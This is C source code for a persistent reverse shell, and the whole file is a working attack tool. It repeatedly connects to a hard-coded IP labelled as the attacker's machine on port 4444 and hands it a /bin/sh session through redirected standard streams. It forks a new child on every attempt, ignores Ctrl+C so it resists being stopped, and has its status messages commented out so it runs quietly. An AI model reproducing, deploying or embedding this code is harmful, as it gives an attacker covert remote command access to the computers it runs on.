#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>

#define IP "192.168.100.215"  // Attacker's machine IP
#define PORT 4444              // Port to use for the connection

// Signal handler to catch SIGINT (Ctrl+C), allowing the program to continue
void handle_sigint(int sig) {
   
}

// Function to attempt a connection and handle retrying
int attempt_connection(struct sockaddr_in *server) {
    int sock;
    while (1) {
        // Create socket for new connection attempt
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
           // perror("Socket creation failed");
            return -1;
        }

        // Try to connect
        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            //perror("Connection failed");
            close(sock);
            sleep(2);  // Wait before retrying
            continue;  // Retry connection indefinitely
        }

       //print this to see connected user- ("Connected to %s:%d\n", IP, PORT);
        return sock;  // Return the socket if successfully connected
    }
}

// Reverse shell function
void reverse_shell(int sock) {
    dup2(sock, 0);  // Redirect stdin
    dup2(sock, 1);  // Redirect stdout
    dup2(sock, 2);  // Redirect stderr

    char *const args[] = {"/bin/sh", NULL};
    execvp(args[0], args);  // Run shell
}

// Main logic to continuously attempt reverse shell connections
int main() {
    signal(SIGINT, handle_sigint);  // Ignore Ctrl+C and allow the program to keep running

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);  // Set the server IP address

    while (1) {
        // Create child process to handle shell while main process handles retries
        pid_t pid = fork();

        if (pid == 0) {
            // In the child process: handle reverse shell logic
            int sock = attempt_connection(&server);  // Try to establish the connection
            if (sock != -1) {
                // Once connected, run reverse shell
                reverse_shell(sock);
                // If shell ends or is disconnected, print the message and restart
               
                close(sock);  // Close socket
                exit(0);      // Exit child process after the shell closes
            } else {
                exit(1);  // Exit child process if connection cannot be established
            }
        }

        // In the parent process: sleep and allow the retry logic to keep going
        sleep(1);  // Sleep between retry attempts of main loop
    }

    return 0;  // End the program if everything fails
}

